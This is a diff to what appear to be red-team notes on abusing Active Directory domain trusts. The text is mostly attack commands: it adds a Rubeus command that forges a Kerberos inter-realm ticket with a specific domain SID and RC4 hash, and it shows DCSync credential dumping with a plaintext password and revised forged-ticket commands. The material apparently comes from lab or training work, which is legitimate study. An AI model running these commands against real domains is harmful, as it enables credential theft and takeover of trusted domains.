@@ -13,7 +13,10 @@
 | 8     | `TRUST_ATTRIBUTE_FOREST_TRANSITIVE`  |
 | 32    | `TRUST_ATTRIBUTE_WITHIN_FOREST`      |
 | 64    | `TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL`  |
-
+`
+```powershell
+execute-assembly ~/opt/Rubeus.exe silver /user:Administrator /domain:zsm.local /sid:S-1-5-21-2734290894-461713716-141835440 /service:krbtgt/zsm.local /rc4:f112ca3fdde9210caf7335939d95c191 /ldap /nowrap
+```
 ##### Inbound Trust Abuse
 
 Enumerate the one-way trust
@@ -39,15 +42,15 @@ make_token CONTOSO\dyork Passw0rd!
 dcsync contoso.com CONTOSO\PARTNER$
 rev2self
 
-7dd5eff4dfa069406ade61cbf61f1f0b39049781179d89c7cef0eb57200526a3
-77057e264522cbf4db45d6733b9167dc
+700f2ef9f5c327c5acb0502277ba9b3847b9e0454dbf27d3658f7249c32e924b
+f112ca3fdde9210caf7335939d95c191
 ```
 
 Forge a referral ticket offline or online using the `/ldap` flag
 ```powershell
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:77057e264522cbf4db45d6733b9167dc /nowrap
 
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /service:krbtgt/partner.com /rc4:77057e264522cbf4db45d6733b9167dc /ldap /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /service:krbtgt/partner.com /rc4:f112ca3fdde9210caf7335939d95c191 /ldap /nowrap
 ```
 
 Use forged inter-realm ticket to request service tickets for the trusting domain
